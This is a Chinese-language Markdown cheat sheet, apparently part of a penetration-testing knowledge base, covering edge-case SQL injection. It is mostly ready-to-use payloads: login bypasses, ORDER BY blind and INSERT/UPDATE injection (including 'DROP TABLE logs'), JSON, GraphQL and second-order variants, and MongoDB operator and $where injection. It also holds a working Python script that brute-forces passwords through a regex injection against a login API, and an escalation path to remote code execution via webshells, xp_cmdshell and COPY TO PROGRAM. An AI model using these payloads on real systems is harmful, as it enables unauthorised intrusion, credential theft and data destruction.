# SQL 注入 — 边角场景 (SCENARIOS)

← 主文件 [sqli.md](sqli.md)

> 本文件收录 SQL 注入的 **非通用注入点** / **特殊上下文** / **NoSQL 变体** / **注入到 RCE 升级链**。
> 通用 payload 矩阵、DBMS 指纹、sqlmap 命令等核心流程仍在 [sqli.md](sqli.md)。

---

## 1. 特殊注入场景

### 1.1 登录认证绕过

```sql
admin'--
admin'#
admin'/*
' OR 1=1--
' OR '1'='1'--
') OR 1=1--
' UNION SELECT 1,'admin','password'--
```

### 1.2 ORDER BY 注入(不能 UNION)

```sql
# 1. 确定列数
?sort=1               → 正常
?sort=(SELECT 1)      → 正常
?sort=(SELECT 1,2)    → 错误 → 说明是 ORDER BY 点

# 2. 使用 CASE WHEN
?sort=(CASE WHEN (SELECT SUBSTRING(user(),1,1))='r' THEN 1 ELSE 1/0 END)
# 若 user 开头 r, 返回正常; 否则除零报错
```

### 1.3 INSERT/UPDATE 注入

```sql
# 场景: 后端执行 INSERT INTO logs (user, ip) VALUES ('$user', '$ip')
# 攻击: 在 user 注入
user='; DROP TABLE logs-- -
user=',(SELECT password FROM admin WHERE id=1))-- -
```

### 1.4 JSON 中的 SQL 注入

```json
{"id": "1' UNION SELECT user(),version()--"}
{"filter": "id=1 OR 1=1"}
{"sort": "(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)"}
```

### 1.5 Second-Order Injection

```
# 注册时:
username = "admin'-- -"    (被转义存入)
# 但数据库里实际存的是 "admin'-- -" (仍带引号)

# 登录时: SELECT * FROM users WHERE username='$db_value'
# 变成 SELECT * FROM users WHERE username='admin'-- -'
# → 截断注入
```

### 1.6 GraphQL + SQL

```graphql
query { user(filter: "id=1' UNION SELECT password FROM admin--") { name } }
```

---

## 2. NoSQL 注入 (MongoDB 等)

### 2.1 认证绕过
```json
{"username":"admin","password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$regex":"^."}}
{"username":{"$ne":null},"password":{"$ne":null}}
```

### 2.2 $where JavaScript 执行 (MongoDB)
```
username=admin&password[$where]=function(){sleep(5000);return this.username=='admin'}
```

### 2.3 盲注提取数据
```python
import requests, string
base = "https://target.com/api/login"
known = ""
for i in range(30):
    for c in string.printable:
        guess = known + c
        r = requests.post(base, json={
            "user":"admin",
            "pass":{"$regex":f"^{guess}"}
        })
        if "success" in r.text:
            known = guess
            print(known)
            break
```

---

## 3. 影响升级(从注入到 RCE)

```
SQL 注入
├── 读 /etc/passwd / web.config / wp-config.php
├── 写 WebShell 到可执行目录
│   └── → RCE
├── MySQL UDF 提权 (若 DBA)
├── MSSQL xp_cmdshell
│   └── EXEC xp_cmdshell 'whoami'
├── PostgreSQL COPY TO PROGRAM (若超级用户)
│   └── COPY (SELECT '') TO PROGRAM 'id'
├── Oracle DBMS_SCHEDULER
└── OOB 提取凭证 → 登录其他服务
```

---

## 4. 相关参考

- 主文件 → [sqli.md](sqli.md)
- Payload 速查 → [../payloads.md](../payloads.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
- 类型混淆(弱比较认证绕过) → [type-juggling.md](type-juggling.md)
